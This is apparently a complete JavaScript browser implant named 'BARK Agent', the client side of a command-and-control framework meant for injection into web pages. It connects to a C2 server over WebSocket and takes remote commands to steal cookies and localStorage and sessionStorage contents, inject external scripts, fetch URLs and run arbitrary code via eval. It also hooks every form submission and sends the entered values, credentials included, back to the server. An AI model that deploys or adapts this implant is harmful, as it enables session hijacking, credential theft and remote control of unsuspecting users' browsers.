(function() {
    console.log("BARK Agent activated");
    
    const BARK_AGENT = {
        version: "1337",
        agentId: null,
        socket: null,
        config: {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            serverUrl: window.location.protocol === 'https:' ? 'wss:' : 'ws:' + '//localhost:8080/ws',
            heartbeatInterval: 5000, // 5 seconds
            reconnectInterval: 30000, // 30 seconds
            maxReconnectAttempts: 5
        },
        
        // Initialize the agent
        init: function() {
            console.log("Agent initializing...");
            this.agentId = "__BARK_AGENT_ID__";
            this.connectToC2();
            this.installHooks();
        },
        
        // Generate unique agent ID
        generateAgentId: function() {
            const timestamp = Date.now().toString(36);
            const randomStr = Math.random().toString(36).substring(2, 10);
            return `agent_${timestamp}_${randomStr}`;
        },
        
        // Get browser and system information
        getSystemInfo: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                currentUrl: window.location.href,
                hostname: window.location.hostname,
                localStorageAvailable: !!window.localStorage
            };
        },
        
        // Connect to C2 server
        connectToC2: function(reconnectAttempt = 0) {
            console.log("[BARK Agent] Establishing connection to C2...");
            
            try {
                this.socket = new WebSocket(this.config.serverUrl);
                
                // Connection opened
                this.socket.addEventListener('open', (event) => {
                    console.log("[BARK Agent] Connection established with C2 server");
                    
                    // Send agent activation message
                    this.sendMessage({
                        type: "agent_activation",
                        agentId: this.agentId,
                        version: this.version,
                        timestamp: new Date().toISOString(),
                        systemInfo: this.getSystemInfo()
                    });
                    
                    // Start heartbeat after successful connection
                    this.startHeartbeat();
                });
                
                // Listen for messages
                this.socket.addEventListener('message', (event) => {
                    this.debug("Raw message received", event.data);
                    this.handleServerMessage(event);
                });
                
                // Handle errors
                this.socket.addEventListener('error', (event) => {
                    console.error("[BARK Agent] WebSocket error:", event);
                });
                
                // Handle connection close
                this.socket.addEventListener('close', (event) => {
                    console.log("[BARK Agent] Connection closed:", event.code, event.reason);
                    
                    // Cleanup heartbeat
                    if (this.heartbeatTimer) {
                        clearInterval(this.heartbeatTimer);
                        this.heartbeatTimer = null;
                    }
                    
                    // Attempt to reconnect if this wasn't a normal closure
                    if (event.code !== 1000 && reconnectAttempt < this.config.maxReconnectAttempts) {
                        const nextAttempt = reconnectAttempt + 1;
                        console.log(`[BARK Agent] Attempting to reconnect (${nextAttempt}/${this.config.maxReconnectAttempts}) in ${this.config.reconnectInterval/1000} seconds...`);
                        
                        setTimeout(() => {
                            this.connectToC2(nextAttempt);
                        }, this.config.reconnectInterval);
                    }
                });
            } catch (error) {
                console.error("[BARK Agent] Failed to connect to C2 server:", error);
            }
        },
        
        // Send message to C2 server
        sendMessage: function(message) {
            if (this.socket && this.socket.readyState === WebSocket.OPEN) {
                try {
                    this.socket.send(JSON.stringify(message));
                    return true;
                } catch (error) {
                    console.error("[BARK Agent] Error sending message:", error);
                    return false;
                }
            }
            return false;
        },
        
        // Handle incoming messages from server
        handleServerMessage: function(event) {
            try {
                const message = JSON.parse(event.data);
                console.log("[BARK Agent] Received message type:", message.type);
                
                switch (message.type) {
                    case "command":
                        console.log("[BARK Agent] Command received:", message.command);
                        
                        // Make sure the command structure exists
                        if (message.command && message.command.id && message.command.action) {
                            this.executeCommand(message.command);
                        } else {
                            console.error("[BARK Agent] Invalid command structure:", message.command);
                        }
                        break;
                    case "config_update":
                        this.updateConfig(message.config);
                        break;
                    case "pong":
                        // Simple acknowledgment of heartbeat
                        console.log("[BARK Agent] Received pong from server");
                        break;
                    default:
                        console.log("[BARK Agent] Unhandled message type:", message.type);
                }
            } catch (error) {
                console.error("[BARK Agent] Error processing message:", error, "Raw data:", event.data);
            }
        },

        debug: function(message, data) {
            const isDebug = true; // Set to false to disable verbose logging
            if (isDebug) {
                if (data) {
                    console.log(`[BARK Agent Debug] ${message}`, data);
                } else {
                    console.log(`[BARK Agent Debug] ${message}`);
                }
            }
        },
        
        // Execute commands from the server - updated to handle module.command format
        executeCommand: function(command) {
            if (!command || !command.action) {
                console.error("[BARK Agent] Invalid command received");
                return;
            }
            
            console.log("[BARK Agent] Executing command:", command.action);
            
            try {
                // Parse command using the [MODULE].[COMMAND].(OPTIONAL VALUES) syntax
                const cmd = command.action;
                let result = null;
                let success = false;
                
                // Handle basic ping command
                if (cmd === "ping") {
                    result = "Pong";
                    success = true;
                } 
                // Handle module-based commands
                else {
                    // Parse command structure
                    const parts = cmd.split('.');
                    const module = parts[0];
                    const action = parts[1];
                    const params = parts.length > 2 ? parts.slice(2) : [];
                    
                    switch (module) {
                        case "recon":
                            result = this.executeReconCommand(action, params);
                            success = true;
                            break;
                            
                        case "dom":
                            result = this.executeDomCommand(action, params);
                            success = true;
                            break;
                            
                        case "storage":
                            result = this.executeStorageCommand(action, params);
                            success = true;
                            break;
                            
                        case "net":
                            result = this.executeNetworkCommand(action, params);
                            success = true;
                            break;
                            
                        case "exec":
                            try {
                                if (action === "eval" && params.length > 0) {
                                    // Join all params and evaluate as JavaScript
                                    const code = params.join('.');
                                    result = eval(code);
                                    success = true;
                                } else {
                                    throw new Error("Invalid eval command");
                                }
                            } catch (e) {
                                result = { error: e.toString() };
                                success = false;
                            }
                            break;
                            
                        default:
                            result = { error: `Unknown module: ${module}` };
                            success = false;
                    }
                }
                
                // Send result back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: result,
                    success: success
                });
                
            } catch (error) {
                console.error("[BARK Agent] Command execution error:", error);
                
                // Send error back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: { error: error.toString() },
                    success: false
                });
            }
        },
        
        // Recon module commands
        executeReconCommand: function(action, params) {
            switch(action) {
                case "browser_info":
                    return {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        cookiesEnabled: navigator.cookieEnabled,
                        plugins: Array.from(navigator.plugins).map(p => ({
                            name: p.name,
                            description: p.description,
                            filename: p.filename
                        }))
                    };
                    
                case "capture_cookies":
                    return this.getCookies();
                    
                case "screen_info":
                    return {
                        width: window.screen.width,
                        height: window.screen.height,
                        colorDepth: window.screen.colorDepth,
                        orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                        devicePixelRatio: window.devicePixelRatio
                    };
                    
                case "location_info":
                    return {
                        url: window.location.href,
                        host: window.location.host,
                        protocol: window.location.protocol,
                        path: window.location.pathname,
                        query: window.location.search,
                        hash: window.location.hash,
                        referrer: document.referrer
                    };
                    
                default:
                    return { error: `Unknown recon action: ${action}` };
            }
        },
        
        // DOM manipulation commands
        executeDomCommand: function(action, params) {
            switch(action) {
                case "get_element":
                    if (params.length < 1) return { error: "Selector required" };
                    const selector = params[0];
                    const element = document.querySelector(selector);
                    if (!element) return { error: "Element not found" };
                    
                    return {
                        tagName: element.tagName,
                        id: element.id,
                        className: element.className,
                        textContent: element.textContent.substring(0, 200) // Limit text length
                    };
                    
                case "get_elements":
                    if (params.length < 1) return { error: "Selector required" };
                    const allSelector = params[0];
                    const elements = Array.from(document.querySelectorAll(allSelector));
                    
                    return elements.map(el => ({
                        tagName: el.tagName,
                        id: el.id,
                        className: el.className,
                        textContent: el.textContent.substring(0, 50) // Limit text length
                    })).slice(0, 20); // Limit to 20 results
                    
                case "inject_script":
                    if (params.length < 1) return { error: "Script URL required" };
                    const scriptUrl = params[0];
                    
                    return new Promise((resolve, reject) => {
                        const script = document.createElement('script');
                        script.src = scriptUrl;
                        script.onload = () => resolve({ success: true });
                        script.onerror = () => reject({ error: "Script failed to load" });
                        document.head.appendChild(script);
                    });
                    
                default:
                    return { error: `Unknown DOM action: ${action}` };
            }
        },
        
        // Storage commands
        executeStorageCommand: function(action, params) {
            switch(action) {
                case "get_local_storage":
                    return this.getLocalStorage();
                    
                case "get_session_storage":
                    try {
                        if (!window.sessionStorage) return { error: "SessionStorage not available" };
                        
                        const storage = {};
                        for (let i = 0; i < sessionStorage.length; i++) {
                            const key = sessionStorage.key(i);
                            storage[key] = sessionStorage.getItem(key);
                        }
                        return storage;
                    } catch (e) {
                        return { error: e.toString() };
                    }
                    
                case "set_local_storage":
                    if (params.length < 2) return { error: "Key and value required" };
                    try {
                        localStorage.setItem(params[0], params[1]);
                        return { success: true };
                    } catch (e) {
                        return { error: e.toString() };
                    }
                    
                default:
                    return { error: `Unknown storage action: ${action}` };
            }
        },
        
        // Network commands
        executeNetworkCommand: function(action, params) {
            switch(action) {
                case "fetch":
                    if (params.length < 1) return { error: "URL required" };
                    const url = params[0];
                    
                    return new Promise((resolve, reject) => {
                        fetch(url)
                            .then(response => response.text())
                            .then(data => resolve({ 
                                success: true, 
                                data: data.substring(0, 1000) // Limit response size
                            }))
                            .catch(error => reject({ error: error.toString() }));
                    });
                    
                case "websocket_info":
                    return {
                        connected: this.socket && this.socket.readyState === WebSocket.OPEN,
                        readyState: this.socket ? this.socket.readyState : null,
                        url: this.config.serverUrl
                    };
                    
                default:
                    return { error: `Unknown network action: ${action}` };
            }
        },
        
        // Update agent configuration
        updateConfig: function(newConfig) {
            if (!newConfig) return;
            
            // Update config properties
            Object.keys(newConfig).forEach(key => {
                if (this.config.hasOwnProperty(key)) {
                    this.config[key] = newConfig[key];
                }
            });
            
            console.log("[BARK Agent] Configuration updated");
            
            // Restart heartbeat with new interval if it changed
            if (newConfig.heartbeatInterval && this.heartbeatTimer) {
                this.startHeartbeat();
            }
        },
        
        // Start heartbeat mechanism
        heartbeatTimer: null,
        startHeartbeat: function() {
            // Clear existing heartbeat if any
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
            }
            
            // Start new heartbeat interval
            this.heartbeatTimer = setInterval(() => {
                this.sendMessage({
                    type: "heartbeat",
                    agentId: this.agentId,
                    timestamp: new Date().toISOString()
                });
            }, this.config.heartbeatInterval);
        },
        
        // Get cookies
        getCookies: function() {
            try {
                return document.cookie.split(';')
                    .map(cookie => cookie.trim().split('='))
                    .reduce((obj, [key, value]) => {
                        if (key) obj[key] = value;
                        return obj;
                    }, {});
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        // Get localStorage content
        getLocalStorage: function() {
            try {
                if (!window.localStorage) return { error: "LocalStorage not available" };
                
                const storage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        // Install hooks for form submissions, etc.
        installHooks: function() {
            try {
                // Monitor form submissions
                document.addEventListener('submit', (e) => {
                    const formData = {};
                    const elements = e.target.elements;
                    
                    for (let i = 0; i < elements.length; i++) {
                        const element = elements[i];
                        if (element.name && element.value) {
                            formData[element.name] = element.value;
                        }
                    }
                    
                    this.sendMessage({
                        type: "form_submission",
                        agentId: this.agentId,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        formData: formData
                    });
                });
                
                console.log("[BARK Agent] Hooks installed");
            } catch (error) {
                console.error("[BARK Agent] Error installing hooks:", error);
            }
        }
    };
    
    // Initialize the agent
    BARK_AGENT.init();
})();